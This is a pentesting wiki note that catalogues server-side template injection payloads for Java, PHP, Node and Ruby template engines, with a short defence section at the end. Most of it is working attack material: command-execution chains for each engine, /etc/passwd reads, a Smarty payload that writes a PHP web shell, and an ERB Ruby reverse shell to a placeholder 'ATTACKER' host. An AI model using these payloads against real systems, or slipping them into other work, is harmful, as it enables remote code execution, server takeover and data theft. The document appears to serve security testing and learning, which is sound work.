---
title: SSTI payloads by template engine
slug: ssti-by-engine
aliases: [SSTI engines, Freemarker SSTI, Thymeleaf SSTI, Twig SSTI, ERB SSTI, EJS SSTI, Velocity SSTI, Pebble SSTI, Smarty SSTI]
---

{% raw %}

> **TL;DR:** Every template engine has its own expression syntax, sandbox escapes, and RCE gadgets. This note catalogues engine-specific payloads beyond the Jinja2 chains covered in [[ssti]] — Freemarker, Velocity, Thymeleaf, Pebble (Java), Twig, Smarty (PHP), EJS, Pug (Node), and ERB (Ruby).

## Detection methodology

### Polyglot probes

Inject these and observe which evaluates — the response fingerprints the engine:

```
${7*7}           → 49  (Freemarker, Velocity, Thymeleaf, Pebble, EJS)
{{7*7}}          → 49  (Jinja2, Twig, Pug, Nunjucks, Angular)
{{7*'7'}}        → 7777777  (Jinja2)  vs  49  (Twig)
<%= 7*7 %>       → 49  (ERB, EJS)
#{7*7}           → 49  (Pug, Thymeleaf inline)
{7*7}            → 49  (Smarty)
```

### Decision tree

```
Inject ${7*7}
├── 49 → Inject ${class.getClass()}
│   ├── error mentioning Freemarker → Freemarker
│   ├── error mentioning Velocity   → Velocity
│   ├── works, Spring context       → Thymeleaf
│   └── works, Pebble error         → Pebble
├── literal → Inject {{7*7}}
│   ├── 49 → Inject {{7*'7'}}
│   │   ├── 7777777 → Jinja2/Nunjucks
│   │   └── 49      → Twig
│   └── literal → Inject <%= 7*7 %>
│       ├── 49 → ERB or EJS
│       └── literal → Inject {7*7}
│           └── 49 → Smarty
```

## Java engines

### Freemarker

```
<#-- RCE via BuiltinUtilities -->
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}

<#-- Alternative: ObjectConstructor -->
<#assign oc = "freemarker.template.utility.ObjectConstructor"?new()>
${oc("java.lang.ProcessBuilder", ["id"])?first}

<#-- File read -->
<#assign is = "freemarker.template.utility.ObjectConstructor"?new()>
${oc("java.util.Scanner", oc("java.io.File", "/etc/passwd")).useDelimiter("\\A").next()}
```

Freemarker ≥ 2.3.17 has a sandbox (`Configuration.setNewBuiltinClassResolver`), but many apps use `UNRESTRICTED_RESOLVE`.

### Velocity (Apache)

```
## Runtime.exec via reflection
#set($rt = $class.forName("java.lang.Runtime"))
#set($m = $rt.getMethod("getRuntime", null))
#set($runtime = $m.invoke(null, null))
#set($proc = $runtime.exec("id"))
#set($is = $proc.getInputStream())
#set($sc = $class.forName("java.util.Scanner"))
#set($scanner = $sc.getConstructor($class.forName("java.io.InputStream")).newInstance($is))
$scanner.useDelimiter("\A").next()

## Shorter if ClassTool is available
#set($e = $class.forName("java.lang.Runtime").getRuntime().exec("id"))
$e
```

### Thymeleaf (Spring)

Thymeleaf is expression-based (SpEL). The classic vector is **view name injection** — if the controller returns unsanitised user input as the view name:

```java
// Vulnerable controller
@GetMapping("/path")
public String handleRequest(@RequestParam String lang) {
    return "welcome_" + lang;  // attacker controls the template path
}
```

```
# SpEL injection via view name — no template file needed
GET /path?lang=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

# In fragment expressions
GET /path?section=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}__::.x
```

Thymeleaf ≥ 3.0.12 restricts `__...__` preprocessing, but bypasses exist if `th:text` / `th:utext` evaluate attacker input as SpEL.

### Pebble

```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName("java.lang.String").constructors[0].newInstance(bytes, "UTF-8") }}
```

Pebble sandboxes `newInstance` in strict mode — test whether it is enforced.

## PHP engines

### Twig

```twig
{# Twig 1.x — _self.env is the Environment object #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# Twig 2.x+ — _self is a Template reference, env access patched #}
{# Use filter/function injection if custom filters are registered #}
{{['id']|filter('system')}}
{{['id']|map('system')}}

{# File read #}
{{"../../../etc/passwd"|file_excerpt(0,100)}}
```

### Smarty

```smarty
{* Smarty 3 — PHP tag execution *}
{php}system('id');{/php}

{* Smarty 3 with php tags disabled — use {if} *}
{if system('id')}{/if}

{* Literal PHP via string *}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']);?>",self::clearConfig())}
```

Smarty's `{php}` tags are disabled by default in Smarty 4+, but `{if}` with PHP functions often still works if `security_policy` is not configured.

## Node.js engines

### EJS (Embedded JavaScript)

```javascript
// Classic: delimiter injection
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

// Via settings object pollution (prototype pollution → SSTI chain)
// If attacker can set ejs options:
{"settings": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}}
```

### Pug (formerly Jade)

```pug
//- Unbuffered code execution
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
= x

//- Inline expression
#{global.process.mainModule.require('child_process').execSync('id')}
```

Pug is rarely directly injectable from user input — more common via [[prototype-pollution]] → template options overwrite.

## Ruby engines

### ERB

```erb
<%= `id` %>
<%= system("id") %>
<%= IO.popen("id").read %>
<%= File.read("/etc/passwd") %>

<%# Reverse shell %>
<%= `ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` %>
```

ERB has no sandbox — any Ruby code executes. The typical vector is user input flowing into `ERB.new(user_input).result`.

## Sandbox escape patterns

Most engine sandboxes restrict class access but miss:
1. **Reflection chains** — `"".getClass().forName("java.lang.Runtime")` bypasses direct class name filters.
2. **Internal template objects** — `_self`, `_context`, `_charset` in Twig; `this`, `env` in Freemarker.
3. **Type coercion** — `(1).TYPE` in Pebble reaches `java.lang.Integer.TYPE` → `Class` object.
4. **Prototype pollution** — in Node engines, polluting `Object.prototype` can inject template options that enable code execution.

## Defence
- Never pass user input into the template source — only into the template context (data).
- Use logic-less templates (Mustache, Handlebars strict mode) where possible.
- Enable engine sandboxes: Freemarker `SAFER_RESOLVER`, Twig `SandboxExtension`, Pebble strict mode.
- WAF rules for `${`, `{{`, `<%` in parameters — but treat as defence-in-depth, not primary control.

See also [[ssti]], [[python-ssti-jinja]], [[client-side-template-injection]], [[expression-injection]].

{% endraw %}

## References
- [HackTricks — SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) — comprehensive engine catalogue
- [PortSwigger — SSTI](https://portswigger.net/web-security/server-side-template-injection) — methodology + labs
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) — payload reference
